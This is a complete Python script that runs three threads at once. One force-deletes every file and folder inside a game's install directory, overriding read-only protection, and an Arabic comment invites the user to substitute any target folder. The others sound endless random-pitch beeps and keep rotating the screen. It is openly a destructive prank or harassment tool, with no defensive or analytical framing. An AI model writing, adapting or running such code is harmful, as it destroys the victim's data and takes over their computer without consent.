import os
import shutil
import stat
import winsound
from random import randrange
import time
import rotatescreen as rs
import threading

def m1():
    folder_path = r"C:\Program Files (x86)\Overwatch" #حط الملف الي تبيه ينحذف كل شي داخله

    def force_delete(path):
        os.chmod(path, stat.S_IWRITE)
        if os.path.isfile(path) or os.path.islink(path):
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path, onerror=on_rm_error)

    def on_rm_error(func, path, exc_info):
        os.chmod(path, stat.S_IWRITE)
        func(path)

    if os.path.exists(folder_path):
        try:
            for item in os.listdir(folder_path):
                item_path = os.path.join(folder_path, item)
                force_delete(item_path)
            print("Success: ")
        except Exception as e:
            print(f"Failed: {e}")
    else:
        print("Folder not found: ")

def m2():
        frequency = randrange(5000)
        duration = randrange(30000)
        for i in range(1000):    
            winsound.Beep(frequency,duration)

def m3():
    pd = rs.get_primary_display()
    angle_list = [90, 180, 270, 0]
    for i in range(1000):
        for angle in angle_list:
            pd.rotate_to(angle)
            time.sleep(0.5)

t1 = threading.Thread(target=m1)
t2 = threading.Thread(target=m2)
t3 = threading.Thread(target=m3)
t1.start()
t2.start()
t3.start()
t1.join()
t2.join()
t3.join()



